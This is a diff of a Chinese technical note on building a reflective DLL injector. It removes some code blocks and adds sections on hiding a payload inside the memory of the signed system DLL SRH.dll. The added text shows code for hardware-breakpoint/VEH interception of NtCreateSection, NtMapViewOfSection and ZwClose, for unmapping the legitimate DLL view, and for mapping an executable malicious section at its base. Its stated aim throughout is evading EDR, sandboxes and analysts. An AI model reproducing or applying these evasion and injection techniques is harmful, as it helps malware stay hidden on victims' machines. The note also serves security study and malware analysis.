@@ -2,12 +2,11 @@
 tags:
   - 反射式注入
   - 进程注入
-  - Windows安全
   - 免杀技术
-  - EDR绕过
 date: 2026-05-31
 star: true
 ---
+
 # 反射DLL
 
 
@@ -20,76 +19,17 @@ star: true
 
 ### 注入器(Stage 1)
 
-注入器作为初始加载器，负责探测环境，查询进程信息，下载反射DLL。如有必要，可以创建互斥体来确保系统中只有一个实例运行。o
+注入器作为初始加载器，负责探测环境，查询进程信息，下载反射DLL。
 
 当注入器通过前期的情报收集确定当前运行的环境是正常的（比如没有调试器附加，没有运行在沙箱或虚拟机中），就会开始尝试向指定进程注入DLL。这个进程可以是一些不起眼的进程，最好该进程的操作特征与反射DLL中的恶意代码相匹配（如向外网发起连接请求，扫描文件，创建或关闭进程等）。
 
-**查询目标进程的PID**
-
-注入器会解析远程进程的程序文件名来找到目标进程的PID，通过拍摄一次当前系统中进程的快照，检索进程的PE文件名称是否与目标参数一致来找到目标进程的PID。
-
-```c
-    proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-
-    // set the size of the structure before using it.
-    pe32.dwSize = sizeof(PROCESSENTRY32);
-
-    // retrieve information about the first process and exit if unsuccessful.
-    Process32First(proc_snap, &pe32)
-
-    // display information about all processes in the snapshot.
-    do
-    {
-        to_tower_case_wide(pe32.szExeFile);
-        if (wcscmp((pe32.szExeFile), proc_name) == 0)
-        {
-            CloseHandle(proc_snap);
-            return pe32.th32ProcessID;
-        }
-
-    } while (Process32Next(proc_snap, &pe32));
-```
-
-在找到目标进程的PID之后，通过`OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)`获取目标进程的句柄，如果打开失败，则可能需要另寻其他目标，或者尝试提权。如果都以失败告终，则程序必须考虑结束自己。
-
-**解析DLL**
+注入器需要获取到目标进程的PID，通过`OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)`获取目标进程的句柄，如果打开失败，则可能需要另寻其他目标，或者尝试提权。如果都以失败告终，则程序必须考虑结束自己。
 
 在确定目标进程可以被注入之后，注入器会开始下载反射DLL并手动解析。其中最重要的一步是找到反射函数在DLL文件中的偏移，以及反射函数的大小。思路是这样的：解析DLL的导出表(EAT)，遍历整张表，找到反射函数的明文字符，获取函数地址，并使用`rva2raw`函数进行虚拟地址到文件偏移的转换，如果函数的第一条指令是跳转指令，还需要解析这条`jmp`指令得到偏移量，最终得到函数在文件中真正的起始地址。
 
-PE 文件中的 `Exception Directory` 结构中存储了所有函数的其实地址和结束地址。遍历整个表，将`BeginAddress`与得到的`ReflectiveFunction` 的起始地址比较，得到`EndAddress`。函数的大小通过
-$$
-Size = EndAddress - BeginAddress
-$$
-得到。
-```c
-byte_t* DLLParser::find_func_end(byte_t* func_raw_ptr)
-{
+PE 文件中的 `Exception Directory` 结构中存储了所有函数的其实地址和结束地址。遍历整个表，将`BeginAddress`与得到的`ReflectiveFunction` 的起始地址比较，得到`EndAddress`。
 
-	PRUNTIME_FUNCTION p_runtime_func = (PRUNTIME_FUNCTION)(
-		base + 
-		rva2raw(optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress
-			, pe_sections
-			, (int)file_header.NumberOfSections));
-
-	for (size_t i = 0; i < optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(RUNTIME_FUNCTION); i++)
-	{
-		// Access the fields of each RUNTIME_FUNCTION structure
-		if (p_runtime_func[i].BeginAddress == 0 && p_runtime_func[i].EndAddress == 0 && p_runtime_func[i].UnwindData == 0)
-			continue;
-
-		if ((byte_t*)rva2raw(p_runtime_func[i].BeginAddress, pe_sections, (int)file_header.NumberOfSections) == func_raw_ptr) {
-
-			return (byte_t*)(rva2raw(p_runtime_func[i].EndAddress - 1, pe_sections, (int)file_header.NumberOfSections));
-		}
-
-	}
-
-	return nullptr;
-}
-```
-
-
-注入器会有一个预留的KEY用来加密反射函数。在得到反射函数的起始地址和函数的大小之后就会开始对反射函数进行加密。当这一切都准备妥当之后，注入器首先申请一段内存，大小为自定义头部的大小+反射DLL的大小。头部的数据包括`魔数，解密的KEY，反射函数的大小` 等。最后使用`WriteProcessMemory`向进程写入这些数据。
+注入器需要使用一个加密算法加密反射函数。在得到反射函数的起始地址和函数的大小之后就会开始对反射函数进行加密。当这一切都准备妥当之后，注入器首先申请一段内存，大小为自定义头部的大小+反射DLL的大小。头部的数据包括`魔数，解密的KEY，反射函数的大小` 等。最后使用`WriteProcessMemory`向进程写入这些数据。
 
 最后，注入器开始启动远程线程。它会先找到反射DLL中的预加载函数（方法与寻找反射函数一致），然后创建远程线程，并设置起始地址为这个预加载函数。`ResumeThread`函数执行之后，注入就完成了。
 
@@ -99,121 +39,131 @@ byte_t* DLLParser::find_func_end(byte_t* func_raw_ptr)
 
 **预加载函数**
 
-预加载函数的编写与普通函数不同，该函数不能引用任何需要重定位的地址，即不能引用任何全局变量和API。`GetProcAddress` 和 `GetModuleHandle` 这些API必须手工实现，
-
-预加载函数使用下面这种方式来获取当前DLL的内存地址。
-```c
-/*
-	_123321_asdf21425 是预加载函数的函数名，这行代码对应的汇编指令如下：
-	lea     rax, _123321_asdf21425
-	其硬编码为 48 8D 05 A4 FE FF FF
-	反汇编结果：
-	0:  48 8d 05 a4 fe ff ff    lea    rax,[rip+0xfffffffffffffea4]
-	
-	使用当前RIP的值减去当前代码在函数起始处的偏移量，就得到了函数的起始地址。
- */
-dll_base_addr = (ULONG_PTR)_123321_asdf21425;
-
-while (TRUE)
-{
-	// DLL_HEADER结构就是存放在DLL文件起始处之前，由加载器构造填充
-	dll_header = (PDLL_HEADER)dll_base_addr;
-	if (dll_header->header == 0x44434241) {
-		img_dos_hdr = (PIMAGE_DOS_HEADER)(dll_base_addr + sizeof(DLL_HEADER));
-		if (img_dos_hdr->e_magic == IMAGE_DOS_SIGNATURE)
-		{
-			img_nt_hdrs = (PIMAGE_NT_HEADERS)(dll_base_addr + img_dos_hdr->e_lfanew + sizeof(DLL_HEADER));
-			if (img_nt_hdrs->Signature == IMAGE_NT_SIGNATURE)
-				break;
-		}
-	}
-	dll_base_addr--;
-}
-
-// 得到dll的地址
-```
+预加载函数的编写与普通函数不同，该函数不能引用任何需要重定位的地址，即不能引用任何全局变量和API。`GetProcAddress` 和 `GetModuleHandle` 这些API必须手工实现。
 
 预加载器会使用`DLL_HEADER`中的`KEY`解密反射函数，然后手动执行反射函数，等函数返回之后再重新加密并清空`KEY`。如果分析者在反射函数执行完毕后拿到程序的内存，那么这位分析者就永远无法拿到函数的代码。这样做可以尽可能的减少反射函数以明文的方式暴漏在内存的时间。
 
-```c
-// decrypting the reflective function
-pebase = ReflectiveFunction();
-// re-encrypting the reflective function
-
-dll_main = (fnDllMain)(pebase + img_opt_hdr->AddressOfEntryPoint);
-
-HANDLE h_thread = func_CreateThread(
-	NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc,
-	(LPVOID)dll_main, 0, NULL
-);
-```
-
 反射函数自加载它所处的反射DLL，然后返回一个DLL的基地址。接着预加载函数创建线程从DLL的入口开始执行。
 
-**自加载函数**
+**内存视图交换**
 
-反射函数通过对`ZwClose` ，`NtMapViewOfSection` 和 `NtCreateSection` 函数的入口打上硬件断点，并注册一个向量化异常处理例程，当触发单步异常时（如硬件断点），该异常处理例程就会被执行。异常处理例程通过调用这些API的`detour function` 对传入的参数进行修改。反射函数使用`LoadLibraryEx`加载牺牲的DLL(`SRH.dll`)，由于`LoadLibraryEx`会调用我们之前设置断点的几个API函数，所以当这些函数被`LoadLibraryEx`函数调用时，我们的异常处理例程就可以捕获这些单步异常，并调用对应的`detour function`去修改参数。`LoadLibraryEx`会对加载的DLL创建一个`Section`对象，并在最后通过`ZwClose`函数关闭这个对象。我们使用`ZwCloseDetour`函数来跳过该函数，保留该对象。当`LoadLibraryEx`函数执行完毕，我们移除该向量化异常处理例程，并取消这些硬件断点。
+该实现的核心思路可以分为五个阶段：
+
+1. **无痕 Hooking**：利用硬件断点（HWBP）和向量化异常处理（VEH）拦截关键内核 API。
+2. **加载牺牲载体**：静默加载一个合法的系统 DLL 作为伪装外壳。
+3. **狸猫换太子**：取消原合法 DLL 的内存映射，并将恶意 Section 映射到该基址。
+4. **底层句柄枚举**：通过遍历系统内核对象，精准定位并窃取目标 Section 句柄。
+
+为了在系统加载合法 DLL 时“窃取”关键信息，代码必须监控 `LoadLibrary` 底层触发的 API。传统 Inline Hook 会修改 `ntdll.dll` 的 `.text` 段，极易触发 EDR 的完整性校验。
 
 ```c
-fnAddVectoredExceptionHanlder func_AddVectoredExceptionHandler = (fnAddVectoredExceptionHanlder)GPAR(hm_kernel32, str_AddVectoredExceptionHandler);
-fnRemoveVectoredExceptionHandler func_RemoveVectoredExceptionHandler = (fnRemoveVectoredExceptionHandler)GPAR(hm_kernel32, str_RemoveVectoredExceptionHandler);
-
-if ((func_LoadLibraryExA = (fnLoadLibraryExA)GPAR(hm_kernel32, str_LoadLibraryExA)) == NULL)
-    return FALSE;
-if ((func_LoadLibraryA = (fnLoadLibraryA)GPAR(hm_kernel32, str_LoadLibraryA)) == NULL)
-    return FALSE;
-if (!(func_RtlAddFunctionTable = (fnRtlAddFunctionTable)GPAR(hm_kernel32, str_RtlAddFunctionTable)))
-    return FALSE;
-
-SYSCALL_ENTRY zw_func_s[AmountofSyscalls] = { 0 };
-retrieve_zw_func_s(GMHR(str_ntdll), zw_func_s);
-
-
-/* set hardware breakpoint and detour functions */
 func_AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)&VectorHandler);
-
-addr_ZwClose = GPAR(hm_ntdll, str_ZwClose);
-addr_NtMapViewOfSection = GPAR(hm_ntdll, str_NtMapViewOfSection);
-addr_NtCreateSection = GPAR(hm_ntdll, str_NtCreateSection);
-
-if (addr_ZwClose != NULL
-    && addr_NtCreateSection != NULL
-    && addr_NtMapViewOfSection != NULL
-    )
-{
-    set_hwbp(DrIndex::DR1, addr_ZwClose, zw_func_s);
-    set_hwbp(DrIndex::DR2, addr_NtMapViewOfSection, zw_func_s);
-    set_hwbp(DrIndex::DR3, addr_NtCreateSection, zw_func_s);
-}
-
-/*------------------------------LOADING SACRIFICAL DLL---------------------*/
-
-PBYTE sac_dll_base = NULL;
-CHAR sac_dll_path[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\','S','R','H','.','d','l','l','\0' };
-
-HMODULE sac_dll_module_by_LoadLibrary = NULL;
-sac_dll_module_by_LoadLibrary = func_LoadLibraryExA(sac_dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
-
-unset_hwbp(DrIndex::DR1);
-unset_hwbp(DrIndex::DR2);
-unset_hwbp(DrIndex::DR3);
-
-func_RemoveVectoredExceptionHandler((PVECTORED_EXCEPTION_HANDLER)&VectorHandler);
-
+...
+set_hwbp(DrIndex::DR3, addr_NtCreateSection, zw_func_s);
+set_hwbp(DrIndex::DR2, addr_NtMapViewOfSection, zw_func_s);
+set_hwbp(DrIndex::DR1, addr_ZwClose, zw_func_s);
 ```
 
-最后`find_SRH_DLL_section_handle`函数获得`SRH.dll`的`Section`对象的句柄。
+**硬件断点 (HWBP) + VEH (Vectored Exception Handler)**
+
+利用 CPU 的调试寄存器（DR1-DR3），对 `NtCreateSection`、`NtMapViewOfSection` 和 `ZwClose` 这三个底层 API 下硬件断点。这种方式**完全不需要修改任何内存字节**，EDR 的内存完整性扫描对此完全免疫。当系统底层调用这些 API 时，触发硬件异常，控制权交由自定义的 `VectorHandler` 进行参数记录或逻辑篡改。
+
+随后，代码选择加载一个系统原生的、带有完美微软签名的 DLL（示例为 `SRH.dll`）作为“替身”。
+
 ```c
-HANDLE sac_dll_handle = find_SRH_DLL_section_handle(zw_func_s, (fnGetProcessId)GPAR(hm_kernel32, str_GetProcessId));
+sac_dll_module_by_LoadLibrary = func_LoadLibraryExA(sac_dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
 ```
 
-反射函数也通过`RIP`寄存器获取当前模块的DLL头部，并使用`mem_to_free`变量记录该地址（由于我们之前通过`VirtualAllocEx`函数申请了这块内存，后续我们需要释放这块内存避免内存泄漏）。
+使用 `DONT_RESOLVE_DLL_REFERENCES` 标志。 这个标志告诉系统：**只把这个 DLL 映射到内存里，不要调用它的 `DllMain`，也不要加载它的依赖库。** 这样既实现了内存空间的占位（获取了一个合法 File-backed 的内存视图），又避免了执行未知 DLL 代码可能引发的崩溃或安全软件警报，真正做到了“静默占位”。
 
-反射函数创建一个新的`Section`对象，其大小稍大于`SRH.dll`的大小（因为我们需要额外记录某些信息）。紧接着，它会取消映射由`LoadLibraryEx`函数映射的`SRH.dll`的视图，记录该模块的基地址，并在该基地址处重新映射我们刚刚创建的`Section`对象的视图（用于反射DLL，我们简称mal_dll）。我们记录牺牲的DLL(SRH.dll)的Section句柄，刚刚创建的Section句柄，以及新创建的Section大小和mem_to_free，将这些信息放在基地址头部。紧接着拷贝反射DLL的信息到刚刚新建的Section中。
+随后**卸载真实合法的内存视图，原址映射恶意的内存区段**。
 
-接下来，我们需要将注入器在远程进程中申请的用于存储反射DLL文件的内存空间拷贝到刚刚新创建的内存视图当中去，并且进行PE文件的加载（手动修复IAT，进行重定位，注册异常函数表等），最后一步，我们创建一个新的线程，用于执行CRT初始化，并跳到DllMain函数中。
+```c
+// 1. 创建全新的 Section（容纳 Payload）
+ZwCreateSection(&new_section_handle, SECTION_ALL_ACCESS, ... PAGE_EXECUTE_READWRITE, SEC_COMMIT, ...);
 
-反射DLL的内存驻留方案核心是通过**内存地址重用**技术，实现在同一内存地址无缝替换DLL，同时保持执行连续性。这是一种高级的进程内存操作技术。在`sleaping`函数中实现。
+// 2. 卸载合法的牺牲 DLL 视图
+ZwUnmapViewOfSection(((HANDLE)(LONG_PTR)-1), sac_dll_module_by_LoadLibrary, ...);
+
+// 3. 将恶意 Section 映射回刚刚卸载的基址处
+sac_dll = (PVOID)sac_dll_module_by_LoadLibrary;
+ZwMapViewOfSection(new_section_handle, ((HANDLE)(LONG_PTR)-1), &sac_dll, ... PAGE_EXECUTE_READWRITE, ...);
+```
+
+经过这三步操作，进程空间中原本属于 `SRH.dll` 的内存地址（该地址在系统 VAD 树中记录为由磁盘上的合法 DLL 映射而来），现在实际上被替换成了攻击者自定义的 `new_section_handle` 的内容。 当 EDR 粗略遍历内存模块或进行堆栈回溯时，看到的是一段属于微软签名 DLL 的合法内存，从而实现了完美的隐蔽（Memory Hollowing）。
+
+默认情况下，`LoadLibrary` 在完成映射后会关闭 Section 句柄。为了获取刚刚加载的`SRH.dll` 的 Section 句柄。需要进行全局句柄枚举，通过 `ZwQuerySystemInformation(SystemHandleInformation)` 获取当前系统所有的对象句柄。筛选出属于当前进程的句柄，并调用 `ZwQueryObject(ObjectTypeInformation)`，精准筛选出类型为 `Section` 的句柄。
+
+> Section 的两种面孔
+>
+> 在 Windows 内核中，区段对象（Section Object）是一块可以映射到进程虚拟地址空间的内存。但 Section 创建时，其内部属性有着本质的区别。1）Data Section（数据区段）：通常通过 `SEC_COMMIT` 或 `SEC_RESERVE` 标志创建。用于内存映射文件（如把一个 `.txt` 映射到内存）或进程间共享内存。内存管理器把它当成**一整块纯粹的二进制数据**，不关心里面的内容结构。2）Image Section（映像区段）：通过 `SEC_IMAGE` 标志创建。专门用于映射可执行文件（`.exe` 或 `.dll`）。当映射 Image Section 时，内核的内存管理器会**解析 PE 头**。它不会像数据文件那样原封不动地平铺进内存，而是根据 PE 头的 Section Table（`.text`、`.data`、`.rdata` 等）指定的相对虚拟地址（RVA）和内存对齐属性，把文件“拉伸”并重新拼装在内存中。
+
+内存管理器在映射前，会提取 PE 头里的 `ImageBase`，然后去检查目标进程的这块地址是否被占用了。 在现代 Windows 中，由于 **ASLR（地址空间布局随机化）** 的强制启用，系统**几乎绝对不可能**把 DLL 映射到它原本固定的 `ImageBase` 上；再者，如果像代码中那样，调用 API 时由系统动态分配地址（`BaseAddress = NULL`），分配的地址也肯定和 `ImageBase` 不匹配。当系统发现分配的实际基址 $\neq$ `ImageBase` 时，内存管理器依然会完成映射操作，但它会抛出一个警告级别（Warning）的  `STATUS_IMAGE_NOT_AT_BASE (0x40000003)`，告诉调用者：“映像已经映射好了，但是位置不是它理想的首选基址，可能需要进行重定位（Relocation）。”
+
+> **补充说明：** NTSTATUS 码的最高两位表示严重程度。`0x0...` 表示成功，`0x4...` 表示信息/警告，`0x8...` 表示错误，`0xC...` 表示严重错误。所以 `0x40000003` 代表这是一个“带有警告信息的成功”。
+
+```c
+        // ------------------------------------------------------------
+        // 尝试映射该 Section 对象的一个视图
+        // 若映射返回 STATUS_IMAGE_NOT_AT_BASE (0x40000003)，
+        // 表示该 Section 是一个可执行映像（DLL/EXE）且未加载到首选基址，
+        // 这正是我们需要的特征。
+        // ------------------------------------------------------------
+        if ((status = ZwMapViewOfSection(
+            (void*)handle.Handle,
+            ((HANDLE)(LONG_PTR)-1),
+            &view_base,
+            NULL, NULL, NULL,
+            &view_size,
+            ViewShare,
+            0,
+            PAGE_READONLY,
+            zw_func_s[ZwMapViewOfSectionF].SSN,
+            zw_func_s[ZwMapViewOfSectionF].sysretAddr))
+            != 0x40000003)
+        {
+
+            // 如果映射成功（status == 0）但不是预期的状态，说明不是 DLL 映像，需要清理并继续
+            if (status == 0)
+            {
+                if (status = ZwUnmapViewOfSection(
+                    ((HANDLE)(LONG_PTR)-1), view_base,
+                    zw_func_s[ZwUnmapViewOfSectionF].SSN,
+                    zw_func_s[ZwUnmapViewOfSectionF].sysretAddr
+                ) != 0)
+                {
+                    return FALSE;
+                }
+            }
+
+            view_base = NULL;
+            continue;
+        }
+```
+
+通过这种方式，我们把鉴别工作直接推给了 Windows 内核的内存管理器。在 Ring 0 层瞬间过滤掉 99% 的无用 Data Section，只留下属于 PE 映像的区段。它不需要在用户态手动解析未知的内存结构，完全避免了因为内存访问越界（Access Violation）导致的恶意软件自杀。这个鉴别过程不涉及任何内存读取动作，只是正常的 API 调用，EDR 根本无法从行为上判定这是一个“正在扫描 PE 头部”的恶意操作。（但是高频的`ZwMapViewOfSection`可以引起EDR的关注）
+
+**反射函数自加载**
+
+最后反射函数手动完成将 PE（Portable Executable）文件格式在内存中展开、解析和初始化的全过程。反射加载器函数首先需要找到自身以及它所承载的完整 DLL 在当前进程内存中的起始地址。找到基址后，加载器开始充当系统加载器的角色，解析原始文件格式的 PE 结构。PE 文件在磁盘上的紧凑物理布局（Raw Data）和在内存中按页对齐的虚拟布局（Virtual Data）是不同的。加载器需要完成这种布局转换。
+
+被加载的 DLL 运行必定需要调用外部系统的 API（例如 `user32.dll` 中的 `MessageBoxA`）。
+
+- 加载器解析 **导入目录 (Import Directory)**，找出该 DLL 依赖的所有外部模块（DLL）名称。
+- 通过手动遍历系统结构（如 PEB 的加载模块列表）或调用正常的 `LoadLibrary` 来加载这些依赖模块。
+- 接着，解析每个需要导入的函数名或序号，通过 `GetProcAddress`（或其底层手动实现）获取这些函数在当前系统中的真实内存地址。
+- 最后，将这些真实的绝对地址填入当前 DLL 的 **导入地址表 (IAT)** 中。
+
+由于系统安全机制（如 ASLR）或内存占用的原因，加载器分配的新内存基址极大概率不等于 DLL 编译时预设的 **首选基址 (ImageBase)**。此时，DLL 内部硬编码的全局变量或绝对内存跳转地址就会全部失效。
+
+- 加载器读取 **基址重定位表 (Base Relocation Table)**。
+- 计算出实际加载基址与首选基址之间的差值（Delta）。
+- 遍历重定位表，将这个差值逐一加到需要修正的硬编码地址上，完成内存地址的动态修复。
+
+**内存地址重用**
+
+
+反射DLL的内存驻留方案核心是通过内存地址重用技术，实现在同一内存地址无缝替换DLL，同时保持执行连续性。这是一种高级的进程内存操作技术。在`sleaping`函数中实现。
 
 **sleaping**
 
@@ -265,88 +215,6 @@ Main thread
     │   └─ Timer 2 (300ms): ResumeThread (Thread 1)
     │
     └─ Wait for all threads to complete
-```
-
-
-
-
-### 辅助函数实现参考
-
-**GetModuleHandle实现**
-
-`PPEBC	pPeb = (PEBC*)(__readgsqword(0x60))` 通过msvc编译器提供的函数来获取当前进程的PEB，找到`PEBC_LDR_DATA`的`Ldr`，遍历 `Ldr->InMemoryOrderModuleList`，这是一个由`LDR_DATA_TABLE_ENTRYC`结构构成的链表。`InInitializationOrderLinks.Flink`成员就是该模块的起始地址。
-
-```c
-PPEBC pPeb = (PEBC*)(__readgsqword(0x60));
-
-PPEBC_LDR_DATA pLdr = (PPEBC_LDR_DATA)(pPeb->Ldr);
-PLDR_DATA_TABLE_ENTRYC	pDte = (PLDR_DATA_TABLE_ENTRYC)(pLdr->InMemoryOrderModuleList.Flink);
-
-while (pDte) 
-{
-	if (pDte->FullDllName.Length != NULL) 
-	{
-		ToLowerCaseWIDE(pDte->FullDllName.Buffer);
-		ToLowerCaseWIDE(szModuleName);
-		if (ComprareStringWIDE(pDte->FullDllName.Buffer, szModuleName))
-			return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
-	}
-	else 
-		break;
-
-	pDte = *(PLDR_DATA_TABLE_ENTRYC*)(pDte);
-}
-```
-
-
-**GetProcAddress实现**
-
-`hModule`参数就是指向模块在内存中的起始地址，反射DLL需要做的就是解析这个PE文件，找到导出表，接着遍历导出表中的函数名字数组，找到匹配的函数并得到函数的RVA。如果函数的RVA落在导出表内部，说明该“函数”实际上是一个**转发器字符串**（例如 `"NTDLL.RtlAllocateHeap"`），而不是真正的可执行代码地址。此时就需要使用`GetProcessAddress(LoadLibrary(dll), function)`得到真正的函数地址。
-
-```c
-
-/* 使用函数名获取地址的主要逻辑 */
-for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) 
-{
-	CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
-
-	if (CompareStringASCII(lpApiName, pFunctionName)) 
-	{
-		functionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
-
-		if (functionAddress >= (PBYTE)pImgExportDir && functionAddress < (PBYTE)(pImgExportDir + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)) 
-		/*
-			处理转发函数
-			如果函数的RVA落在导出表内部，则functionAddress则指向字符串，此时需要解析
-			这个字符串得到DLL名和函数名。并通过LoadLibrary来得到真正的函数地址。
-		 */
-		{
-			ParseForwarder((CHAR*)functionAddress, dll, function);
-			if ((LLA = (fnLoadLibraryA)GPAR(GMHR(kernel32), loadLibraryA)) == NULL)
-				return NULL;
-			if (function[0] == '#') 
-				return GPARO(LLA(dll), custom_stoi(function));
-			else 
-				return GPAR(LLA(dll), function);
-		}
-		else 
-			return (FARPROC)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
-	}
-}
-
-/* 使用序号来获取函数地址 */
-functionAddress = (PBYTE)(pBase + FunctionAddressArray[ordinal]);
-if (functionAddress >= (PBYTE)pImgExportDir && functionAddress < (PBYTE)(pImgExportDir + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)) 
-{
-	ParseForwarder((CHAR*)functionAddress, dll, function);
-	if ((LLA = (fnLoadLibraryA)GPAR(GMHR(kernel32), loadLibraryA)) == NULL)
-		return NULL;
-	if (function[0] == '#')
-		return GPARO(LLA(dll), custom_stoi(function));
-	else
-		return GPAR(LLA(dll), function);
-}
-return (FARPROC)(pBase + FunctionAddressArray[ordinal]);
 ```
 
 ## 免杀扩展
@@ -541,7 +409,5 @@ typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
 
 一旦找到 `ThreadState == 5` 的线程，通过 `Threads[i].ClientId.UniqueThread` 就能拿到该线程的 TID（Thread ID）。接下来，攻击者就可以拿着这个 TID 去调用 `OpenThread` 进行挂起和上下文修改了。
 
-
 ---
-
 - [[computer-security/methodology/malware-analysis/malware-analysis|病毒分析]]
